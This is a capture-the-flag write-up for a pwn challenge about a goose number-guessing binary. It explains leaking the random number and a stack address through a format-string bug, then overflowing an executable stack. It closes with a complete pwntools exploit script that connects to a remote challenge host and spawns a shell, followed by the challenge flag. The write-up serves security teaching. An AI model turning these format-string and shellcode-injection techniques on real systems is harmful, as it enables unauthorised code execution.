## Challenge Description

When the honking gets tough, you better brush up on your basics

We are greeted by a goose, that asks us to guess a number. If we guess correctly we get to write a message to the world.

## Intuition

The protections enabled on the binary tell us that we probably are expected to execute a shell payload from the stack.
```bash
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX unknown - GNU_STACK missing
PIE:        PIE enabled
Stack:      Executable
RWX:        Has RWX segments
Stripped:   No
```

## Solution

Sifting through the code with Ghidra we see that `highscore` is an interesting function\
There is a printf where we control the format string followed by a read of greater size than the stack frame of `0x170`.
```C
  printf("what\'s your name again?");
  __isoc99_scanf(&DAT_001024eb,local_78);
  local_d9 = 0;
  sprintf(local_f8,(char *)&local_58,local_78);
  printf(local_f8);
  read(0,local_178,0x400);
  printf("got it. bye now.");
```
Where `sprintf` is like `printf` but instead of printing it puts the result in `local_f8`.\
To get there though, we must guess a random number generated by the process.
```C
  tVar2 = time((time_t *)0x0);
  srand((uint)tVar2);
  setuser();
  iVar1 = rand();
  nhonks = iVar1 % 0x5b + 10;
  iVar1 = guess();
  if (iVar1 == 0) {
    puts("tough luck. THE GOOSE WINS! GET THE HONK OUT!");
  }
  else {
    highscore();
  }
```
The number is generated before we are asked to guess, which suggests, that it too, must be leaked.\
If we search for it at runtime, we can find it with the global variables, right after the username. Username that gets printed after the number is generated.\
With a long username set in the `setuser` function we get to leak the random value.
```python
position_of_leaked_rand = -18
print(target.sendlineafter(b'e call you?', b'a' * 0x40).decode())
line = target.recvuntil(b'?', timeout=2)
target.sendline(str(line[position_of_leaked_rand]).encode())
```
We send it right back to get access to the `highscore` function.\
There we are asked to input another string, which gets to be the template string for printf, function that we can exploit to leak values on the stack[^1].
```python
print(target.sendlineafter(b'again?', b'%1$p').decode())
line = target.recvuntil(b'so good',timeout=2)
```
Turns out that, on position 1, there is a stack address which we can use to compute the value of `RBP`.\
After that it's just a matter of crafting a shellcode payload, which pwntools can provide.
```python
import pwn
pwn.context.terminal = ['konsole', '-e']

target = pwn.remote('34.45.81.67', 16004)

# leak rand number on .data
position_of_leaked_rand = -18
print(target.sendlineafter(b'e call you?', b'a' * 0x40).decode())
line = target.recvuntil(b'?', timeout=2)
target.sendline(str(line[position_of_leaked_rand]).encode())

# leak stack address
print(target.sendlineafter(b'again?', b'%1$p').decode())
line = target.recvuntil(b'so good',timeout=2)
print(line.decode())

stack_add_pos = 4
offset_to_rbp = 0x4A
rbpaddr = int(line[stack_add_pos:stack_add_pos+14].decode(), base=16) + offset_to_rbp
print(hex(rbpaddr))

# build shell
pwn.context.arch = 'amd64'
buffer_size = 0x170
binshlen = rbplen = 0x8
shell = pwn.asm(pwn.shellcraft.sh())
pay = b'/bin/sh\0' + shell + b'b' * (buffer_size - binshlen - len(shell)) + b'c' * rbplen + pwn.p64(rbpaddr - buffer_size + binshlen)

print(target.sendlineafter(b'world?', pay).decode())

target.interactive()
```
And read the flag with the shell.

### Flag

`L3AK{H0nk_m3_t0_th3_3nd_0f_l0v3}`
